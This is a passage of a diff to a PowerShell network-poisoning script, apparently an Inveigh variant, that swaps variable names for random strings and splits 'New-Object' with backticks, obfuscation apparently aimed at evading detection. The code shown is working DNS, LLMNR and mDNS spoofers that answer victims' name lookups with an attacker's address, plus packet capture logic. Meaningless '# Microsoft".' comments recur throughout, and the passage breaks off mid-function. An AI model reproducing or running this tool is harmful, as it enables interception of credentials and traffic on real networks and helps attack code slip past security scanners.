-                if($SlimyCable -and ($FairAblaze -contains $LittleLowly -or $FairAblaze -contains $BuryRustic -or $FairAblaze -contains 'All'))
+                if($QXplYkjxeRFAgTbHwoZGdRyj -and ($NJquQJdotFLnYRzmvZcDDMgYuxhLWvmllbBNpsWFnKORo -contains $faGTzGnMHxDNWDmxikWiLidyZdMakjiscEflfRBg -or $NJquQJdotFLnYRzmvZcDDMgYuxhLWvmllbBNpsWFnKORo -contains $nSkTPQMNREAclANJjjnvkYEaYrGDXGdSCliSpOeC -or $NJquQJdotFLnYRzmvZcDDMgYuxhLWvmllbBNpsWFnKORo -contains 'All'))
                 {
 
-                    if($ScaleAgree)
+                    if($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy)
                     {
-                        $HangRigid = ([datetime]::UtcNow)-(Get-Date "1/1/1970")
-                        $SpringOffer = [System.BitConverter]::GetBytes($WoodCar + 14)
+                        $DqpkzBduRVXpHujodykWwWLweU = ([datetime]::UtcNow)-(Get-Date "1/1/1970")
+                        $ZyBwJuotrqFoSZqaTrzQWtnoYJWWAkEpwrTnwCseju = [System.BitConverter]::GetBytes($AMQewCxOFzVNJKNOZyvxIpbTFGSlirlcCSfTBjk + 14)
                         
-                        $PersonDetect = [System.BitConverter]::GetBytes([Int][Math]::Truncate($HangRigid.TotalSeconds)) + 
-                            [System.BitConverter]::GetBytes($HangRigid.Milliseconds) + # Microsoft".
-                            $SpringOffer +
-                            $SpringOffer +
+                        $bZyXbwpvvmxZhYHRIDLCedZ = [System.BitConverter]::GetBytes([Int][Math]::Truncate($DqpkzBduRVXpHujodykWwWLweU.TotalSeconds)) + 
+                            [System.BitConverter]::GetBytes($DqpkzBduRVXpHujodykWwWLweU.Milliseconds) + # Microsoft".
+                            $ZyBwJuotrqFoSZqaTrzQWtnoYJWWAkEpwrTnwCseju +
+                            $ZyBwJuotrqFoSZqaTrzQWtnoYJWWAkEpwrTnwCseju +
                             (,0x00 * 12) +
                             0x08,0x00 +
-                            $byte_data[0..($WoodCar - 1)]
+                            $byte_data[0..($AMQewCxOFzVNJKNOZyvxIpbTFGSlirlcCSfTBjk - 1)]
 
-                        switch ($SlimyCable)
+                        switch ($QXplYkjxeRFAgTbHwoZGdRyj)
                         {
 
                             'File'
@@ -4593,20 +4593,20 @@ $InnatePrefer =
 
                                 try
                                 {
-                                    $DogWrist.Write($PersonDetect,0,$PersonDetect.Count)    
+                                    $eQuAaLZewdchKzENGMelcbMezYTquEGpXhOOdMP.Write($bZyXbwpvvmxZhYHRIDLCedZ,0,$bZyXbwpvvmxZhYHRIDLCedZ.Count)    
                                 }
                                 catch
                                 {
                                     $error_message = $_.Exception.Message
                                     $error_message = $error_message -replace "`n",""
-                                    $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+                                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
                                 }
                         
                             }
 
                             'Memory'
                             {
-                                $LightOval.pcap.AddRange($PersonDetect) 
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.pcap.AddRange($bZyXbwpvvmxZhYHRIDLCedZ) 
                             }
 
                         }
@@ -4621,542 +4621,542 @@ $InnatePrefer =
 
     }
 
-    $ToothGrowth.Close()
-    $FowlTrust.Dispose()
-    $FowlTrust.Close()
-    $DogWrist.Close()
+    $lVPQuznRjTvjwjudGISkIZMvQsiELCgEUYEIQ.Close()
+    $knGyKHzBgCXpkjMLUJmgulXgSJWPNlUeId.Dispose()
+    $knGyKHzBgCXpkjMLUJmgulXgSJWPNlUeId.Close()
+    $eQuAaLZewdchKzENGMelcbMezYTquEGpXhOOdMP.Close()
 }
 
 # Microsoft".
-$PressScream = 
+$EjVQkImoQAYoNxZEBqgvqnPIRUIKUARer = 
 {
-    param ($MeekSmoggy,$HandsHop,$StickLame)
+    param ($ljmosEibVSNBPotWNpujNBqreoZueTjDFsfrajowAsCn,$uJYtaPKHBkqYNTkyQSeECcLBxVkiaeVYMOZmxVHhhl,$zkTvnUBoWamaHbrMDvklWqGBdwC)
 
-    $NationSlow = $true
-    $PiesSide = ne`w-`obje`ct System.Net.IPEndPoint ([IPAddress]::Any,53)
+    $NcFQeMTEPDbMGGiLlkckiFhrymhsfg = $true
+    $iibNljfZwfnqbnRUmoGdiSgqkcRIdCorBLgNkwkEhcjL = ne`w`-`ob`je`ct System.Net.IPEndPoint ([IPAddress]::Any,53)
 
     try
     {
-        $PersonScale = ne`w-`obje`ct System.Net.Sockets.UdpClient 53
+        $twerrFJGPjwQuoLkywJyfceQkIYmniuAzuEuVW = ne`w`-`ob`je`ct System.Net.Sockets.UdpClient 53
     }
     catch
     {
-        $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] Error starting DNS spoofer") > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] [$(Get-Date -format s)] Error starting DNS spoofer") > $null
         $error_message = $_.Exception.Message
         $error_message = $error_message -replace "`n",""
-        $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
-        $NationSlow = $false
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+        $NcFQeMTEPDbMGGiLlkckiFhrymhsfg = $false
     }
 
-    $PersonScale.Client.ReceiveTimeout = 5000
-    $TailCharge = [System.BitConverter]::GetBytes($HandsHop)
-    [Array]::Reverse($TailCharge)
+    $twerrFJGPjwQuoLkywJyfceQkIYmniuAzuEuVW.Client.ReceiveTimeout = 5000
+    $JGhyxoIMSuOPHZLXbjdDZysCVBd = [System.BitConverter]::GetBytes($uJYtaPKHBkqYNTkyQSeECcLBxVkiaeVYMOZmxVHhhl)
+    [Array]::Reverse($JGhyxoIMSuOPHZLXbjdDZysCVBd)
 
-    while($LightOval.running -and $NationSlow)
+    while($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.running -and $NcFQeMTEPDbMGGiLlkckiFhrymhsfg)
     {   
 
         try
         {
-            $SnatchChief = $PersonScale.Receive([Ref]$PiesSide)
+            $zbFsJnIAJjyoNZRdVOhnhHIFzCmkZYAqkobiphYHCOIP = $twerrFJGPjwQuoLkywJyfceQkIYmniuAzuEuVW.Receive([Ref]$iibNljfZwfnqbnRUmoGdiSgqkcRIdCorBLgNkwkEhcjL)
         }
         catch
         {
-            $PersonScale.Close()
-            $PersonScale = ne`w-`obje`ct System.Net.Sockets.UdpClient 53
-            $PersonScale.Client.ReceiveTimeout = 5000
+            $twerrFJGPjwQuoLkywJyfceQkIYmniuAzuEuVW.Close()
+            $twerrFJGPjwQuoLkywJyfceQkIYmniuAzuEuVW = ne`w`-`ob`je`ct System.Net.Sockets.UdpClient 53
+            $twerrFJGPjwQuoLkywJyfceQkIYmniuAzuEuVW.Client.ReceiveTimeout = 5000
         }
         
-        if($SnatchChief -and [System.BitConverter]::ToString($SnatchChief[10..11]) -ne '00-01')
+        if($zbFsJnIAJjyoNZRdVOhnhHIFzCmkZYAqkobiphYHCOIP -and [System.BitConverter]::ToString($zbFsJnIAJjyoNZRdVOhnhHIFzCmkZYAqkobiphYHCOIP[10..11]) -ne '00-01')
         {
-            $WiseSquash = Get-NameQueryString 12 $SnatchChief
-            $GrowthShiny = $SnatchChief[12..($WiseSquash.Length + 13)]
-            $JazzyArrive = "[+]"
+            $vFHZSPSNtCycYdounQRMVZOVRRTcn = Get-NameQueryString 12 $zbFsJnIAJjyoNZRdVOhnhHIFzCmkZYAqkobiphYHCOIP
+            $IVmhQmxJBBMLrKHCGWvstTssO = $zbFsJnIAJjyoNZRdVOhnhHIFzCmkZYAqkobiphYHCOIP[12..($vFHZSPSNtCycYdounQRMVZOVRRTcn.Length + 13)]
+            $uFsmsawLbDwlxnGQtMAdCzEw = "[+]"
 
-            $BlotKiss = $SnatchChief[0,1] +
+            $xOCCvuYsyWmwcGUvJnJXIudwBdgWlffr = $zbFsJnIAJjyoNZRdVOhnhHIFzCmkZYAqkobiphYHCOIP[0,1] +
                                     0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
-                                    $GrowthShiny +
+                                    $IVmhQmxJBBMLrKHCGWvstTssO +
                                     0x00,0x01,0x00,0x01 +
-                                    $GrowthShiny +
+                                    $IVmhQmxJBBMLrKHCGWvstTssO +
                                     0x00,0x01,0x00,0x01 +
-                                    $TailCharge +
+                                    $JGhyxoIMSuOPHZLXbjdDZysCVBd +
                                     0x00,0x04 +
-                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$StickLame)).GetAddressBytes()
+                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$zkTvnUBoWamaHbrMDvklWqGBdwC)).GetAddressBytes()
 
-            $StuffSky = $PiesSide.Address
-            $StageLovely = Get-SpooferResponseMessage -ExpectRitzy $WiseSquash -EarBucket "DNS" -GustyDance $HomelyShow
-            $JazzyArrive = $StageLovely[0]
-            $StageLovely = $StageLovely[1]
+            $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd = $iibNljfZwfnqbnRUmoGdiSgqkcRIdCorBLgNkwkEhcjL.Address
+            $OjLzwPPNPHmLcNBvqQjoaQgrKWcNSMvjNhLdOmwALxKne = Get-SpooferResponseMessage -NQpqJdcaPdBxCbTbtuyURGPLJeTMXeilVXTLmURiSyK $vFHZSPSNtCycYdounQRMVZOVRRTcn -NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa "DNS" -uemMcbPkfaIvvmaKKrSfGp $tPEylzZKZOmcrNuZqaNvxfEfrUAkL
+            $uFsmsawLbDwlxnGQtMAdCzEw = $OjLzwPPNPHmLcNBvqQjoaQgrKWcNSMvjNhLdOmwALxKne[0]
+            $OjLzwPPNPHmLcNBvqQjoaQgrKWcNSMvjNhLdOmwALxKne = $OjLzwPPNPHmLcNBvqQjoaQgrKWcNSMvjNhLdOmwALxKne[1]
 
-            if($StageLovely -eq '[response sent]')
+            if($OjLzwPPNPHmLcNBvqQjoaQgrKWcNSMvjNhLdOmwALxKne -eq '[response sent]')
             {
-                $SealMass = ne`w-`obje`ct System.Net.IPEndpoint($PiesSide.Address,$PiesSide.Port)
-                $PersonScale.Connect($SealMass)
-                $PersonScale.Send($BlotKiss,$BlotKiss.Length)
-                $PersonScale.Close()
-                $PersonScale = ne`w-`obje`ct System.Net.Sockets.UdpClient 53
-                $PersonScale.Client.ReceiveTimeout = 5000
+                $wgoXBQFtHCEeBwpPAWjqwAjcuM = ne`w`-`ob`je`ct System.Net.IPEndpoint($iibNljfZwfnqbnRUmoGdiSgqkcRIdCorBLgNkwkEhcjL.Address,$iibNljfZwfnqbnRUmoGdiSgqkcRIdCorBLgNkwkEhcjL.Port)
+                $twerrFJGPjwQuoLkywJyfceQkIYmniuAzuEuVW.Connect($wgoXBQFtHCEeBwpPAWjqwAjcuM)
+                $twerrFJGPjwQuoLkywJyfceQkIYmniuAzuEuVW.Send($xOCCvuYsyWmwcGUvJnJXIudwBdgWlffr,$xOCCvuYsyWmwcGUvJnJXIudwBdgWlffr.Length)
+                $twerrFJGPjwQuoLkywJyfceQkIYmniuAzuEuVW.Close()
+                $twerrFJGPjwQuoLkywJyfceQkIYmniuAzuEuVW = ne`w`-`ob`je`ct System.Net.Sockets.UdpClient 53
+                $twerrFJGPjwQuoLkywJyfceQkIYmniuAzuEuVW.Client.ReceiveTimeout = 5000
             }
            
-            $LightOval.output_queue.Add("$JazzyArrive [$(Get-Date -format s)] DNS request for $WiseSquash received from $StuffSky $StageLovely") > $null
-            $SnatchChief = $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("$uFsmsawLbDwlxnGQtMAdCzEw [$(Get-Date -format s)] DNS request for $vFHZSPSNtCycYdounQRMVZOVRRTcn received from $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd $OjLzwPPNPHmLcNBvqQjoaQgrKWcNSMvjNhLdOmwALxKne") > $null
+            $zbFsJnIAJjyoNZRdVOhnhHIFzCmkZYAqkobiphYHCOIP = $null
         }
         
     }
 
-    $PersonScale.Close()
+    $twerrFJGPjwQuoLkywJyfceQkIYmniuAzuEuVW.Close()
 }
 
 # Microsoft".
-$UsedMice = 
+$SNRderqeHFbwJuNrKPKkOevSiCtMqJojXzWyfC = 
 {
-    param ($MeekSmoggy,$TeaseNasty,$StickLame,$BikeLoud,$HoleRoute,$WoozyClose,$ObeyAttack,$JokeFaulty)
+    param ($ljmosEibVSNBPotWNpujNBqreoZueTjDFsfrajowAsCn,$UdYfMnaGXJWMXhxYZmYdzwcmAzjlyonIBluDRRRurFD,$zkTvnUBoWamaHbrMDvklWqGBdwC,$EPlJedBuToZfupQVQRyNJcsGRdsiyc,$fASVUOYmrApOtQBmKFuEovhUMlVuanUGYXvQMnoGTxjXo,$swtccPhWthPrfRuqcBjGDBsGzLJxpUPliCqsEYyFZFe,$GeJSNuMkVuobUeQRhIVNdNxEwPrMoNg,$iNyWtiQGdKJEvnLZUaOj)
 
-    $FowlIcky = $true
-    $YamGuitar = ne`w-`obje`ct System.Net.IPEndPoint ([IPAddress]::Any,5355)
+    $bJRXaFTGeZmJRxQDbkubXrtEYCU = $true
+    $rmQRHtjQOGRmIcEtdGLxvqauyYaOm = ne`w`-`ob`je`ct System.Net.IPEndPoint ([IPAddress]::Any,5355)
 
     try
     {
-        $MarkMatter = ne`w-`obje`ct System.Net.Sockets.UdpClient
-        $MarkMatter.ExclusiveAddressUse = $false
-        $MarkMatter.Client.SetSocketOption("Socket", "ReuseAddress", $true)
-        $MarkMatter.Client.Bind($YamGuitar)
+        $dImCocHHmdSTrJTKItCYkyCCtpOe = ne`w`-`ob`je`ct System.Net.Sockets.UdpClient
+        $dImCocHHmdSTrJTKItCYkyCCtpOe.ExclusiveAddressUse = $false
+        $dImCocHHmdSTrJTKItCYkyCCtpOe.Client.SetSocketOption("Socket", "ReuseAddress", $true)
+        $dImCocHHmdSTrJTKItCYkyCCtpOe.Client.Bind($rmQRHtjQOGRmIcEtdGLxvqauyYaOm)
     }
     catch
     {
-        $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] Error starting LLMNR spoofer") > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] [$(Get-Date -format s)] Error starting LLMNR spoofer") > $null
         $error_message = $_.Exception.Message
         $error_message = $error_message -replace "`n",""
-        $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
-        $FowlIcky = $false
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+        $bJRXaFTGeZmJRxQDbkubXrtEYCU = $false
     }
 
-    $PassCoil = [IPAddress]"224.0.0.252"
-    $MarkMatter.JoinMulticastGroup($PassCoil)
-    $MarkMatter.Client.ReceiveTimeout = 5000
-    $CheapSuperb = [System.BitConverter]::GetBytes($TeaseNasty)
-    [Array]::Reverse($CheapSuperb)
+    $BlZVMFmCRRmiVpznQqtWdykVc = [IPAddress]"224.0.0.252"
+    $dImCocHHmdSTrJTKItCYkyCCtpOe.JoinMulticastGroup($BlZVMFmCRRmiVpznQqtWdykVc)
+    $dImCocHHmdSTrJTKItCYkyCCtpOe.Client.ReceiveTimeout = 5000
+    $NzacYfJsqZUHMnRJtpphrZrmhXCbd = [System.BitConverter]::GetBytes($UdYfMnaGXJWMXhxYZmYdzwcmAzjlyonIBluDRRRurFD)
+    [Array]::Reverse($NzacYfJsqZUHMnRJtpphrZrmhXCbd)
 
-    while($LightOval.running -and $FowlIcky)
+    while($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.running -and $bJRXaFTGeZmJRxQDbkubXrtEYCU)
     {   
 
         try
         {
-            $SixTrade = $MarkMatter.Receive([Ref]$YamGuitar)
+            $vcMngxkCzsqNLaAntRlRGEpRSgESFKYTx = $dImCocHHmdSTrJTKItCYkyCCtpOe.Receive([Ref]$rmQRHtjQOGRmIcEtdGLxvqauyYaOm)
         }
         catch
         {      
-            $MarkMatter.Close()
-            $YamGuitar = ne`w-`obje`ct System.Net.IPEndPoint ([IPAddress]::Any,5355)
-            $MarkMatter = ne`w-`obje`ct System.Net.Sockets.UdpClient
-            $MarkMatter.ExclusiveAddressUse = $false
-            $MarkMatter.Client.SetSocketOption("Socket", "ReuseAddress", $true)
-            $MarkMatter.Client.Bind($YamGuitar)
-            $PassCoil = [IPAddress]"224.0.0.252"
-            $MarkMatter.JoinMulticastGroup($PassCoil)
-            $MarkMatter.Client.ReceiveTimeout = 5000
+            $dImCocHHmdSTrJTKItCYkyCCtpOe.Close()
+            $rmQRHtjQOGRmIcEtdGLxvqauyYaOm = ne`w`-`ob`je`ct System.Net.IPEndPoint ([IPAddress]::Any,5355)
+            $dImCocHHmdSTrJTKItCYkyCCtpOe = ne`w`-`ob`je`ct System.Net.Sockets.UdpClient
+            $dImCocHHmdSTrJTKItCYkyCCtpOe.ExclusiveAddressUse = $false
+            $dImCocHHmdSTrJTKItCYkyCCtpOe.Client.SetSocketOption("Socket", "ReuseAddress", $true)
+            $dImCocHHmdSTrJTKItCYkyCCtpOe.Client.Bind($rmQRHtjQOGRmIcEtdGLxvqauyYaOm)
+            $BlZVMFmCRRmiVpznQqtWdykVc = [IPAddress]"224.0.0.252"
+            $dImCocHHmdSTrJTKItCYkyCCtpOe.JoinMulticastGroup($BlZVMFmCRRmiVpznQqtWdykVc)
+            $dImCocHHmdSTrJTKItCYkyCCtpOe.Client.ReceiveTimeout = 5000
         }
 
-        if($SixTrade -and [System.BitConverter]::ToString($SixTrade[($SixTrade.Length - 4)..($SixTrade.Length - 3)]) -ne '00-1c') # Microsoft".
+        if($vcMngxkCzsqNLaAntRlRGEpRSgESFKYTx -and [System.BitConverter]::ToString($vcMngxkCzsqNLaAntRlRGEpRSgESFKYTx[($vcMngxkCzsqNLaAntRlRGEpRSgESFKYTx.Length - 4)..($vcMngxkCzsqNLaAntRlRGEpRSgESFKYTx.Length - 3)]) -ne '00-1c') # Microsoft".
         {
 
-            $MonkeyBounce = $SixTrade[0,1] +
+            $MxUiTohrBdRtfpJJHlVCFuTqPwJHWmdGbVG = $vcMngxkCzsqNLaAntRlRGEpRSgESFKYTx[0,1] +
                                      0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
-                                     $SixTrade[12..$SixTrade.Length] +
-                                     $SixTrade[12..$SixTrade.Length] +
-                                     $CheapSuperb +
+                                     $vcMngxkCzsqNLaAntRlRGEpRSgESFKYTx[12..$vcMngxkCzsqNLaAntRlRGEpRSgESFKYTx.Length] +
+                                     $vcMngxkCzsqNLaAntRlRGEpRSgESFKYTx[12..$vcMngxkCzsqNLaAntRlRGEpRSgESFKYTx.Length] +
+                                     $NzacYfJsqZUHMnRJtpphrZrmhXCbd +
                                      0x00,0x04 +
-                                     ([System.Net.IPAddress][String]([System.Net.IPAddress]$StickLame)).GetAddressBytes()
+                                     ([System.Net.IPAddress][String]([System.Net.IPAddress]$zkTvnUBoWamaHbrMDvklWqGBdwC)).GetAddressBytes()
         
-            $BeamWild = [Text.Encoding]::UTF8.GetString($SixTrade[13..($SixTrade[12] + 12)])     
-            $StuffSky = $YamGuitar.Address
-            $LooseMarked = "[+]"
+            $MrKQFTNhIzMKcZXlZyjkshpRuNzQqQzmISbCV = [Text.Encoding]::UTF8.GetString($vcMngxkCzsqNLaAntRlRGEpRSgESFKYTx[13..($vcMngxkCzsqNLaAntRlRGEpRSgESFKYTx[12] + 12)])     
+            $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd = $rmQRHtjQOGRmIcEtdGLxvqauyYaOm.Address
+            $hRSKEVuGVxPBlvZBUErJdxFbtRuOMKO = "[+]"
 
-            if(!$LightOval.request_table.ContainsKey($BeamWild))
+            if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table.ContainsKey($MrKQFTNhIzMKcZXlZyjkshpRuNzQqQzmISbCV))
             {
-                $LightOval.request_table.Add($BeamWild.ToLower(),[Array]$StuffSky.IPAddressToString)
-                $LightOval.request_table_updated = $true
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table.Add($MrKQFTNhIzMKcZXlZyjkshpRuNzQqQzmISbCV.ToLower(),[Array]$thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd.IPAddressToString)
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table_updated = $true
             }
             else
             {
-                $LightOval.request_table.$BeamWild += $StuffSky.IPAddressToString
-                $LightOval.request_table_updated = $true
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table.$MrKQFTNhIzMKcZXlZyjkshpRuNzQqQzmISbCV += $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd.IPAddressToString
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table_updated = $true
             }
 
-            $StitchYak = Get-SpooferResponseMessage -ExpectRitzy $BeamWild -EarBucket "LLMNR" -GustyDance $LipMeat
-            $LooseMarked = $StitchYak[0]
-            $StitchYak = $StitchYak[1]
+            $HVZgZkinqJsSdXQRFLmSIUTZLmJsqoryabeXdJgza = Get-SpooferResponseMessage -NQpqJdcaPdBxCbTbtuyURGPLJeTMXeilVXTLmURiSyK $MrKQFTNhIzMKcZXlZyjkshpRuNzQqQzmISbCV -NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa "LLMNR" -uemMcbPkfaIvvmaKKrSfGp $PFkUZTrIToIoyXaKEeXORSPy
+            $hRSKEVuGVxPBlvZBUErJdxFbtRuOMKO = $HVZgZkinqJsSdXQRFLmSIUTZLmJsqoryabeXdJgza[0]
+            $HVZgZkinqJsSdXQRFLmSIUTZLmJsqoryabeXdJgza = $HVZgZkinqJsSdXQRFLmSIUTZLmJsqoryabeXdJgza[1]
 
-            if($StitchYak -eq '[response sent]')
+            if($HVZgZkinqJsSdXQRFLmSIUTZLmJsqoryabeXdJgza -eq '[response sent]')
             {
-                $HelpClap = ne`w-`obje`ct Net.IPEndpoint($YamGuitar.Address,$YamGuitar.Port)
-                $MarkMatter.Connect($HelpClap)
-                $MarkMatter.Send($MonkeyBounce,$MonkeyBounce.Length)
-                $MarkMatter.Close()
-                $MarkMatter = ne`w-`obje`ct System.Net.Sockets.UdpClient
-                $MarkMatter.ExclusiveAddressUse = $false
-                $MarkMatter.Client.SetSocketOption("Socket", "ReuseAddress", $true)
-                $MarkMatter.Client.Bind($YamGuitar)
-                $PassCoil = [IPAddress]"224.0.0.252"
-                $MarkMatter.JoinMulticastGroup($PassCoil)
-                $MarkMatter.Client.ReceiveTimeout = 5000
+                $wvMPdlpuZvFlfKDVkLQHJtHZZTk = ne`w`-`ob`je`ct Net.IPEndpoint($rmQRHtjQOGRmIcEtdGLxvqauyYaOm.Address,$rmQRHtjQOGRmIcEtdGLxvqauyYaOm.Port)
+                $dImCocHHmdSTrJTKItCYkyCCtpOe.Connect($wvMPdlpuZvFlfKDVkLQHJtHZZTk)
+                $dImCocHHmdSTrJTKItCYkyCCtpOe.Send($MxUiTohrBdRtfpJJHlVCFuTqPwJHWmdGbVG,$MxUiTohrBdRtfpJJHlVCFuTqPwJHWmdGbVG.Length)
+                $dImCocHHmdSTrJTKItCYkyCCtpOe.Close()
+                $dImCocHHmdSTrJTKItCYkyCCtpOe = ne`w`-`ob`je`ct System.Net.Sockets.UdpClient
+                $dImCocHHmdSTrJTKItCYkyCCtpOe.ExclusiveAddressUse = $false
+                $dImCocHHmdSTrJTKItCYkyCCtpOe.Client.SetSocketOption("Socket", "ReuseAddress", $true)
+                $dImCocHHmdSTrJTKItCYkyCCtpOe.Client.Bind($rmQRHtjQOGRmIcEtdGLxvqauyYaOm)
+                $BlZVMFmCRRmiVpznQqtWdykVc = [IPAddress]"224.0.0.252"
+                $dImCocHHmdSTrJTKItCYkyCCtpOe.JoinMulticastGroup($BlZVMFmCRRmiVpznQqtWdykVc)
+                $dImCocHHmdSTrJTKItCYkyCCtpOe.Client.ReceiveTimeout = 5000
             }
         
-            if($SixTrade)
+            if($vcMngxkCzsqNLaAntRlRGEpRSgESFKYTx)
             {
-                $LightOval.output_queue.Add("$LooseMarked [$(Get-Date -format s)] LLMNR request for $BeamWild received from $StuffSky $StitchYak") > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("$hRSKEVuGVxPBlvZBUErJdxFbtRuOMKO [$(Get-Date -format s)] LLMNR request for $MrKQFTNhIzMKcZXlZyjkshpRuNzQqQzmISbCV received from $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd $HVZgZkinqJsSdXQRFLmSIUTZLmJsqoryabeXdJgza") > $null
             }
 
-            $SixTrade = $null
+            $vcMngxkCzsqNLaAntRlRGEpRSgESFKYTx = $null
         }
 
     }
 
-    $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] leaving") > $null
-    $MarkMatter.Close()
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] [$(Get-Date -format s)] leaving") > $null
+    $dImCocHHmdSTrJTKItCYkyCCtpOe.Close()
  }
 
 # Microsoft".
-$SleetGrip = 
+$dINAWiUdSfggURFMdlbCginhqfYAxPEeFPa = 
 {
-    param ($MeekSmoggy,$MurderOffer,$WantLittle,$StickLame,$BikeLoud,$HoleRoute,$WoozyClose,$ObeyAttack)
+    param ($ljmosEibVSNBPotWNpujNBqreoZueTjDFsfrajowAsCn,$LvtxlyiEnOfiOybKhfWwKTUJzJGquSXviBRRk,$oiEknJevzfgMBjSqYIpc,$zkTvnUBoWamaHbrMDvklWqGBdwC,$EPlJedBuToZfupQVQRyNJcsGRdsiyc,$fASVUOYmrApOtQBmKFuEovhUMlVuanUGYXvQMnoGTxjXo,$swtccPhWthPrfRuqcBjGDBsGzLJxpUPliCqsEYyFZFe,$GeJSNuMkVuobUeQRhIVNdNxEwPrMoNg)
 
-    $VisitShaky = $true
-    $WailWooden = ne`w-`obje`ct System.Net.IPEndPoint ([IPAddress]::Any,5353)
+    $IBwSwhAsdBvsAkTIkTXednvPXMmAloUhFMhmsEQPcFm = $true
+    $nYMZHdUnuXpICGtawUkY = ne`w`-`ob`je`ct System.Net.IPEndPoint ([IPAddress]::Any,5353)
 
     try
     {
-        $BanSteel = ne`w-`obje`ct System.Net.Sockets.UdpClient
-        $BanSteel.ExclusiveAddressUse = $false
-        $BanSteel.Client.SetSocketOption("Socket", "ReuseAddress", $true)
-        $BanSteel.Client.Bind($WailWooden)
+        $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk = ne`w`-`ob`je`ct System.Net.Sockets.UdpClient
+        $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.ExclusiveAddressUse = $false
+        $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.Client.SetSocketOption("Socket", "ReuseAddress", $true)
+        $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.Client.Bind($nYMZHdUnuXpICGtawUkY)
 
     }
     catch
     {
-        $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] Error starting mDNS spoofer") > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] [$(Get-Date -format s)] Error starting mDNS spoofer") > $null
         $error_message = $_.Exception.Message
         $error_message = $error_message -replace "`n",""
-        $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
-        $VisitShaky = $false
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+        $IBwSwhAsdBvsAkTIkTXednvPXMmAloUhFMhmsEQPcFm = $false
     }
 
-    $ShrugWicked = [IPAddress]"224.0.0.251"
-    $BanSteel.JoinMulticastGroup($ShrugWicked)
-    $BanSteel.Client.ReceiveTimeout = 5000
-    $PourDesign = [System.BitConverter]::GetBytes($MurderOffer)
-    [Array]::Reverse($PourDesign)
+    $uQlzZatDNQjmziszTuYAqpEsfalCgsSTwh = [IPAddress]"224.0.0.251"
+    $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.JoinMulticastGroup($uQlzZatDNQjmziszTuYAqpEsfalCgsSTwh)
+    $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.Client.ReceiveTimeout = 5000
+    $GdyRflIiJuuSiRDhkkCMfGiUyIqY = [System.BitConverter]::GetBytes($LvtxlyiEnOfiOybKhfWwKTUJzJGquSXviBRRk)
+    [Array]::Reverse($GdyRflIiJuuSiRDhkkCMfGiUyIqY)
 
-    while($LightOval.running -and $VisitShaky)
+    while($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.running -and $IBwSwhAsdBvsAkTIkTXednvPXMmAloUhFMhmsEQPcFm)
     {   
 
         try
         {
-            $SeaJuice = $BanSteel.Receive([Ref]$WailWooden)
+            $fEBuPfpjTQUBaByUreqJmkOkgfJh = $duZyWmMLzfufZNHYxYlBQViNjYujgeZdMLmk.Receive([Ref]$nYMZHdUnuXpICGtawUkY)
         }
         catch
         {
-            $BanSteel.Close()
-            $BanSteel = ne`w-`obje`ct System.Net.Sockets.UdpClient
-            $BanSteel.ExclusiveAddressUse = $false
